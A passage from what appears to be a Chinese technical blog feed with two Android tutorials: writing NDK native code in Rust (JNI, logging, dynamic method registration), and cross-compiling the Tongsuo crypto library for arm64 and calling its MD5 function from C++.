class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.littleq.androidndkdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;ndkdemo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">TextView</span> <span class="variable">tvTitle</span> <span class="operator">=</span> findViewById(R.id.tv_title);</span><br><span class="line">        tvTitle.setText(stringFromJNI());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意，所使用的包名，需要和前面的命名一致，否则会找不到。</p><ul><li>4）运行查看效果</li></ul><p>可以发现，我们现在是成功的用rust来实现了我们第一个ndk。</p><h2 id="进阶使用之添加日志"><a href="#进阶使用之添加日志" class="headerlink" title="进阶使用之添加日志"></a>进阶使用之添加日志</h2><p>我们知道，在大多数调试的过程当中，我们都需要打印些日志来辅助我们分析，在原有的c++的ndk开发中，我们都是使用<code>android/log.h</code>当中的相关函数来执行的日志打印，在rust当中，我们如何使用打印日志的功能呢，下面我们就来一起试一下。</p><h3 id="添加依赖-1"><a href="#添加依赖-1" class="headerlink" title="添加依赖"></a>添加依赖</h3><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;android-ndk-demo&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">jni</span> = <span class="string">&quot;0.20.0&quot;</span></span><br><span class="line"><span class="attr">log</span> = <span class="string">&quot;0.4&quot;</span></span><br><span class="line"><span class="attr">android_logger</span> = <span class="string">&quot;0.11.1&quot;</span></span><br><span class="line"><span class="attr">lazy_static</span> = <span class="string">&quot;1.4.0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[lib]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;ndkdemo&quot;</span></span><br><span class="line"><span class="attr">crate-type</span> = [<span class="string">&quot;cdylib&quot;</span>]</span><br></pre></td></tr></table></figure><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参考自: https://github.com/fukusaka/learning-rust-BitmapPlasma/blob/2556e1a347/rust/src/logger.rs</span></span><br><span class="line"><span class="keyword">use</span> std::sync::Mutex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> android_logger::&#123;Config&#125;;</span><br><span class="line"><span class="keyword">use</span> lazy_static::lazy_static;</span><br><span class="line"><span class="keyword">use</span> log::Level;</span><br><span class="line"></span><br><span class="line">lazy_static! &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">ref</span> INITIALIZED_MUTEX: Mutex&lt;<span class="type">bool</span>&gt; = Mutex::<span class="title function_ invoke__">new</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">use_android_logger</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">initialized</span> = INITIALIZED_MUTEX.<span class="title function_ invoke__">lock</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">if</span> !*initialized &#123;</span><br><span class="line">        android_logger::<span class="title function_ invoke__">init_once</span>(Config::<span class="title function_ invoke__">default</span>().<span class="title function_ invoke__">with_min_level</span>(Level::<span class="built_in">Debug</span>));</span><br><span class="line">        *initialized = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="meta">#[no_mangle]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">extern</span> <span class="keyword">fn</span> <span class="title function_">Java_com_littleq_androidndkdemo_MainActivity_stringFromJNI</span>(</span><br><span class="line">    env: JNIEnv, _: JObject) <span class="punctuation">-&gt;</span> jstring &#123;</span><br><span class="line">    logger::<span class="title function_ invoke__">use_android_logger</span>();</span><br><span class="line">    debug!(<span class="string">&quot;测试日志输出&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.<span class="title function_ invoke__">new_string</span>(<span class="string">&quot;Hello from Rust&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Couldn&#x27;t create java string!&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">into_raw</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以发现，现在日志是可以正常输出的。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog2/image_1DP2kMEZNh.png"></p><h2 id="进阶使用之隐藏动态插入"><a href="#进阶使用之隐藏动态插入" class="headerlink" title="进阶使用之隐藏动态插入"></a>进阶使用之隐藏动态插入</h2><p>我们知道，Android查找函数是通过具体的函数名来查找的，就好比之前我们用过的<code>Java_com_littleq_androidndkdemo_MainActivity_stringFromJNI</code>函数，如果函数名称不是这个，就没办法使用了，然后我们可以通过register的方式来注册函数，接下来我们用rust来实现下相同的功能。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#![cfg(target_os = <span class="string">&quot;android&quot;</span>)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mod</span> logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> std::ffi::c_void;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> jni::objects::&#123;JObject&#125;;</span><br><span class="line"><span class="keyword">use</span> jni::sys::&#123;jint, jstring, JNI_ERR&#125;;</span><br><span class="line"><span class="keyword">use</span> jni::strings::JNIString;</span><br><span class="line"><span class="keyword">use</span> jni::&#123;JavaVM, JNIEnv, NativeMethod&#125;;</span><br><span class="line"><span class="keyword">use</span> log::debug;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">extern</span> <span class="keyword">fn</span> <span class="title function_">func</span>(</span><br><span class="line">    env: JNIEnv, _: JObject) <span class="punctuation">-&gt;</span> jstring &#123;</span><br><span class="line">    logger::<span class="title function_ invoke__">use_android_logger</span>();</span><br><span class="line">    debug!(<span class="string">&quot;测试日志输出&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.<span class="title function_ invoke__">new_string</span>(<span class="string">&quot;Hello from Rust&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Couldn&#x27;t create java string!&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">into_raw</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[no_mangle]</span></span><br><span class="line"><span class="meta">#[allow(non_snake_case)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">JNI_OnLoad</span>(jvm: JavaVM, _reserved: *<span class="keyword">mut</span> c_void) <span class="punctuation">-&gt;</span> jint &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">methods</span> = [</span><br><span class="line">        NativeMethod &#123; name: JNIString::<span class="title function_ invoke__">from</span>(<span class="string">&quot;stringFromJNI&quot;</span>), sig: JNIString::<span class="title function_ invoke__">from</span>(<span class="string">&quot;()Ljava/lang/String;&quot;</span>), fn_ptr: func <span class="keyword">as</span> *<span class="keyword">mut</span> c_void &#125;,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">env</span> = jvm.<span class="title function_ invoke__">get_env</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">version</span> = env.<span class="title function_ invoke__">get_version</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册native 方法</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">cls</span> = <span class="keyword">match</span> env.<span class="title function_ invoke__">find_class</span>(<span class="string">&quot;com/littleq/androidndkdemo/MainActivity&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(clazz) =&gt; clazz,</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(_) =&gt; &#123; <span class="keyword">return</span> JNI_ERR; &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">result</span> = env.<span class="title function_ invoke__">register_native_methods</span>(cls, &amp;methods);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">if</span> result.<span class="title function_ invoke__">is_ok</span>() &#123; version.<span class="title function_ invoke__">into</span>() &#125; <span class="keyword">else</span> &#123; JNI_ERR &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，我们就完成了对于函数的动态注册。然后丢到ida里面看一眼，发现还是蛮酸爽的。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog2/image_rmcxoeTTBH.png"></p><h2 id="个人展望"><a href="#个人展望" class="headerlink" title="个人展望"></a>个人展望</h2><p>从目前来说，rust用来写ndk是可以实现的，但是吧，从先有来说，这个体积出来还是比较大的，刚才我这基本没写什么的函数，出来就4.5m了</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog2/image_1_w8XGKkWu.png"></p><p>也有可能是我编译的问题，出来的体积就是大，再有一个呢，就是目前还没有开源的针对rust的ollvm方案，之前中国Rust开发者大会(RustChinaConf 2021~2022)有一篇演讲提到过rust的代码混淆，可惜目前还没给开源，视频里面说是会公开，在这里我先期待一下了。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog2/image_o6GQ-LqP6t.png"></p><p>相信，如果说有了rust的ollvm，分析起来，估计会更加的酸爽，好了，本文到这里就结束了，感谢大家的阅读。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><p><a href="https://github.com/fukusaka/learning-rust-BitmapPlasma.git" title="https://github.com/fukusaka/learning-rust-BitmapPlasma.git">https://github.com/fukusaka/learning-rust-BitmapPlasma.git</a></p></li><li><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4OTA5NzIzNA==&mid=2649394426&idx=1&sn=4789da398f56ab89f4bdf5453e00e79e&chksm=f42a7f87c35df69100c4263e3d4269f8a14966033f8a1e2f9b3ccce1dea8f2e2446a37af4242&scene=27" title="https://mp.weixin.qq.com/s?__biz=MzI4OTA5NzIzNA==&amp;mid=2649394426&amp;idx=1&amp;sn=4789da398f56ab89f4bdf5453e00e79e&amp;chksm=f42a7f87c35df69100c4263e3d4269f8a14966033f8a1e2f9b3ccce1dea8f2e2446a37af4242&amp;scene=27">https://mp.weixin.qq.com/s?__biz&#x3D;MzI4OTA5NzIzNA&#x3D;&#x3D;&amp;mid&#x3D;2649394426&amp;idx&#x3D;1&amp;sn&#x3D;4789da398f56ab89f4bdf5453e00e79e&amp;chksm&#x3D;f42a7f87c35df69100c4263e3d4269f8a14966033f8a1e2f9b3ccce1dea8f2e2446a37af4242&amp;scene&#x3D;27</a></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;使用Rust编写NDK代码&quot;&gt;&lt;a href=&quot;#使用Rust编写NDK代码&quot; class=&quot;headerlink&quot; title=&quot;使用Rust编写NDK代码&quot;&gt;&lt;/a&gt;使用Rust编写NDK代码&lt;/h1&gt;&lt;p&gt;这次我们来使用rust来编写ndk的代码。&lt;br&gt;作者：littleQ&lt;/p&gt;</summary>
    
    
    
    <category term="Android开发" scheme="http://security-kitchen.com/categories/Android%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Android开发" scheme="http://security-kitchen.com/tags/Android%E5%BC%80%E5%8F%91/"/>
    
    <category term="Rust" scheme="http://security-kitchen.com/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>Android开发（3）——Android集成铜锁(Tongsuo)库（littleQ）</title>
    <link href="http://security-kitchen.com/2023/12/24/littleQ3/"/>
    <id>http://security-kitchen.com/2023/12/24/littleQ3/</id>
    <published>2023-12-23T16:00:00.000Z</published>
    <updated>2023-12-24T14:34:30.301Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android集成铜锁-Tongsuo-库"><a href="#Android集成铜锁-Tongsuo-库" class="headerlink" title="Android集成铜锁(Tongsuo)库"></a>Android集成铜锁(Tongsuo)库</h1><p>作者：littleQ</p><span id="more"></span><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li><a href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86">背景知识</a></li><li><a href="#%E7%BC%96%E8%AF%91%E4%BE%9D%E8%B5%96%E5%BA%93">编译依赖库</a><ul><li><a href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">准备工作</a></li><li><a href="#%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B">编译过程</a></li></ul></li><li><a href="#%E6%B5%8B%E8%AF%95%E7%BC%96%E8%AF%91%E6%95%88%E6%9E%9C">测试编译效果</a></li><li><a href="#%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8">进阶使用</a><ul><li><a href="#%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B">编译过程</a></li></ul></li><li><a href="#%E6%80%BB%E7%BB%93">总结</a></li><li><a href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>铜锁&#x2F;Tongsuo（原BabaSSL）是一个提供现代密码学算法和安全通信协议的开源基础密码库，为存储、网络、密钥管理、隐私计算等诸多业务场景提供底层的密码学基础能力，实现数据在传输、使用、存储等过程中的私密性、完整性和可认证性，为数据生命周期中的隐私和安全提供保护能力。</p><p>最近发现一个国内开源的一个密码学库，里面支持不少前沿的密码学算法，因此呢，突然想水一篇文章了，试着将这个库迁移到Android平台上，然后在Android平台也用一下这些密码学算法。</p><h2 id="编译依赖库"><a href="#编译依赖库" class="headerlink" title="编译依赖库"></a>编译依赖库</h2><p>我的平台是mac, 其他平台自行尝试，Linux理论上只需要改一下ndk路径，win上会不会出问题，自行尝试，这里不做尝试。</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul><li>首先这需要Android NDK的开发环境，至于怎么配置，这里不做特殊说明了，相信做过Android开发应该都很熟悉。</li><li>配置环境变量</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> ANDROID_NDK_ROOT=~/Library/Android/sdk/ndk/23.1.7779620</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$ANDROID_NDK_ROOT</span>/toolchains/llvm/prebuilt/darwin-x86_64/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><ul><li>下载源码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Tongsuo-Project/Tongsuo.git</span><br></pre></td></tr></table></figure><h3 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h3><ul><li>生成编译文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Configure android-arm64 -D__ANDROID_API__=30 --prefix=安装的路径</span><br></pre></td></tr></table></figure><p>这里，我编译的是arm64版的文件，需要其他平台的编译文件，需要自己改构建参数</p><p>其中，<code>armeabi</code> 对应 <code>android-arm</code>, <code>arm64-v8a</code> 对应 <code>android-arm64</code>, <code>x86</code> 对应 <code>android-x86</code> ，<code>x86_64</code>对应 <code>android-x86_64</code>，因为目前主流已经是arm64了，其他的不在赘述。</p><ul><li>开始编译</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j4</span><br></pre></td></tr></table></figure><p>这里是编译的线程数，可以根据自己的电脑自行调整。</p><ul><li>安装库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure><p>这一步操作实际上就是将编译好的文件给移动到安装目录，最终编译得到的结果如下。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog3/image_h-8D-JtEgz.png"></p><p>发现，得到<code>libcrypto.a</code>和<code>libssl.a</code>其实就可以了，到这里编译结束。</p><h2 id="测试编译效果"><a href="#测试编译效果" class="headerlink" title="测试编译效果"></a>测试编译效果</h2><p>编译完成之后，我们就来测试一下我们编译出来的东西是否可用，简单的建立一个Android项目，然后配置下引入静态库，这里我们只处理arm64的情况，其余情况，自行动手。</p><ul><li>拷贝对应文件，目录结构如下图所示</li></ul><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog3/image_py6DfTL0IR.png"></p><ul><li>编写cmake脚本，引入静态库，新增代码如下</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">project(<span class="string">&quot;tongsuodemo&quot;</span>)</span><br><span class="line"></span><br><span class="line">INCLUDE_DIRECTORIES(include)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">find_library( <span class="comment"># Sets the name of the path variable.</span></span><br><span class="line">        log-lib</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Specifies the name of the NDK library that</span></span><br><span class="line">        <span class="comment"># you want CMake to locate.</span></span><br><span class="line">        <span class="built_in">log</span>)</span><br><span class="line"></span><br><span class="line">add_library(libssl</span><br><span class="line">        STATIC</span><br><span class="line">        IMPORTED)</span><br><span class="line"></span><br><span class="line">add_library(libcrypto</span><br><span class="line">        STATIC</span><br><span class="line">        IMPORTED)</span><br><span class="line"></span><br><span class="line">set_target_properties(</span><br><span class="line">        libssl</span><br><span class="line">        PROPERTIES IMPORTED_LOCATION</span><br><span class="line"></span><br><span class="line">        <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/lib/arm64/libssl.a)</span><br><span class="line"></span><br><span class="line">set_target_properties(</span><br><span class="line">        libcrypto</span><br><span class="line">        PROPERTIES IMPORTED_LOCATION</span><br><span class="line"></span><br><span class="line">        <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/lib/arm64/libcrypto.a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Specifies libraries CMake should link to your target library. You</span></span><br><span class="line"><span class="comment"># can link multiple libraries, such as libraries you define in this</span></span><br><span class="line"><span class="comment"># build script, prebuilt third-party libraries, or system libraries.</span></span><br><span class="line"></span><br><span class="line">target_link_libraries( <span class="comment"># Specifies the target library.</span></span><br><span class="line">        tongsuodemo</span><br><span class="line">        libcrypto</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Links the target library to the log library</span></span><br><span class="line">        <span class="comment"># included in the NDK.</span></span><br><span class="line">        <span class="variable">$&#123;log-lib&#125;</span>)</span><br></pre></td></tr></table></figure><ul><li>编写测试代码</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;openssl/md5.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 计算对应传入字符串的MD5值</span></span><br><span class="line"><span class="comment"> * @param str  入参</span></span><br><span class="line"><span class="comment"> * @return 计算md5之后的结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">std::string <span class="title">md5</span><span class="params">(<span class="type">const</span> std::string str)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> hash[MD5_DIGEST_LENGTH];</span><br><span class="line">    MD5_CTX md5Ctx;</span><br><span class="line">    <span class="built_in">MD5_Init</span>(&amp;md5Ctx);</span><br><span class="line">    <span class="built_in">MD5_Update</span>(&amp;md5Ctx, str.<span class="built_in">c_str</span>(), str.<span class="built_in">size</span>());</span><br><span class="line">    <span class="built_in">MD5_Final</span>(hash, &amp;md5Ctx);</span><br><span class="line">    std::ostringstream oss;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MD5_DIGEST_LENGTH; ++i) &#123;</span><br><span class="line">        oss &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; std::<span class="built_in">setw</span>(<span class="built_in">sizeof</span>(<span class="type">char</span>) * <span class="number">2</span>)</span><br><span class="line">            &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">unsigned</span>&gt;(hash[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> oss.<span class="built_in">str</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">JNIEXPORT jstring JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_com_littleq_tongsuodemo_MainActivity_stringFromJNI</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        JNIEnv *env,</span></span></span><br><span class="line"><span class="params"><span class="function">        jobject <span class="comment">/* this */</span>)</span> </span>&#123;</span><br><span class="line">    std::string hello = <span class="string">&quot;Hello from C++&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">NewStringUTF</span>(<span class="built_in">md5</span>(<span class="string">&quot;&quot;</span>).<span class="built_in">c_str</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>运行查看结果</li></ul><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog3/image_aoS08ONj27.png"></p><p>发现，结果并没有错误，集成完成。</p><h2 id="进阶使用"><a href="#进阶使用" class="headerlink" title="进阶使用"></a>进阶使用</h2><p>我们编译出来这个，重点是看中了他有额外的算法库，这里我们尝试下用下他们最新的算法库，这里需要重新编译下，然后打开算法的支持。</p><h3 id="编译过程-1"><a href="#编译过程-1" class="headerlink" title="编译过程"></a>编译过程</h3><ul><li>生成编译文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make clean <span class="comment"># 如果之前没编译过的话，可以不执行这条命令</span></span><br><span class="line">./Configure android-arm64 -D__ANDROID_API__=30 enable-paillier --prefix=安装的路径</span><br><span class="line">make -j4</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><ul><li>修改<code>build.gradle</code>，如果这里最低版本和编译的不一致，会报错找不到符号，所以需要改一下</li></ul><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    namespace <span class="string">&#x27;com.littleq.tongsuodemo&#x27;</span></span><br><span class="line">    compileSdk <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId <span class="string">&quot;com.littleq.tongsuodemo&quot;</span></span><br><span class="line">        minSdk <span class="number">30</span></span><br><span class="line">        